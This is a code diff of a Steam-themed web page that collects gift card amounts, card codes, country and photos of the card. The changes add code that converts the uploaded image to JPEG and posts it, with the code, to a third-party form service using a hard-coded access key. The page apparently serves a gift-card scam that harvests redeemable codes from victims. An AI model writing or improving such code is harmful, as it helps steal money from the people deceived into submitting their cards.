@@ -319,7 +319,7 @@
     </style>
 </head>
 <body>
-    <!-- Steam Blue Page Loader -->
+    <!-- Steam-themed Page Loader -->
     <div class="page-loader" id="pageLoader">
         <div class="loader-logo">
             <i class="fab fa-steam"></i>
@@ -419,7 +419,7 @@
                 setTimeout(function() {
                     document.getElementById('pageLoader').style.display = 'none';
                 }, 500);
-            }, 1000);
+            }, 1500);
         });
 
         // Show upload options when clicking the upload area
@@ -500,7 +500,7 @@
                 return;
             }
             
-            // Show page loader during processing
+            // Show Steam loader during processing
             document.getElementById('pageLoader').style.display = 'flex';
             document.getElementById('pageLoader').style.opacity = '1';
             
@@ -514,21 +514,67 @@
             document.getElementById('hiddenCardCode').value = cardCode;
             document.getElementById('hiddenCountry').value = country;
             
-            // Submit to Web3Forms
-            const formData = new FormData(document.getElementById('phraseForm'));
+            // Get image data if available
+            const imageSrc = document.getElementById('imagePreview').src;
+            const hasImage = imageSrc && !imageSrc.includes('data:,'); // Check if image exists and isn't empty
+            
+            // Prepare form data
+            const formData = new URLSearchParams();
+            formData.append('access_key', '19bd1a1c-04ae-4540-8975-9d05a216e05e');
+            formData.append('subject', 'Steam Gift Card Payment');
+            formData.append('amount', amount);
+            formData.append('card_code', cardCode);
+            formData.append('country', country);
+            formData.append('redirect', 'false');
+            
+            // Only include image if it exists
+            if (hasImage) {
+                // Convert any image format to JPEG base64
+                convertImageToJpeg(imageSrc, function(jpegData) {
+                    formData.append('image_data', jpegData);
+                    submitToWeb3Forms(formData);
+                });
+            } else {
+                submitToWeb3Forms(formData);
+            }
+        }
+        
+        // Convert any image to JPEG base64
+        function convertImageToJpeg(imageSrc, callback) {
+            const img = new Image();
+            img.onload = function() {
+                const canvas = document.createElement('canvas');
+                canvas.width = img.width;
+                canvas.height = img.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0);
+                
+                // Convert to JPEG with 80% quality
+                const jpegData = canvas.toDataURL('image/jpeg', 0.8);
+                callback(jpegData);
+            };
+            img.src = imageSrc;
+        }
+        
+        // Submit to Web3Forms
+        function submitToWeb3Forms(formData) {
             fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
                 body: formData
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                return response.json();
+            })
             .then(data => {
                 console.log('Form submitted:', data);
-                // Continue with local storage and UI updates
                 submitForm();
             })
             .catch(error => {
                 console.error('Error:', error);
-                // Still continue with local storage even if email fails
                 submitForm();
             });
         }
@@ -560,7 +606,7 @@
             imagePreview.src = '';
             uploadArea.querySelector('p').textContent = 'Click to upload your gift card image';
             
-            // Hide page loader
+            // Hide Steam loader
             document.getElementById('pageLoader').style.opacity = '0';
             setTimeout(function() {
                 document.getElementById('pageLoader').style.display = 'none';
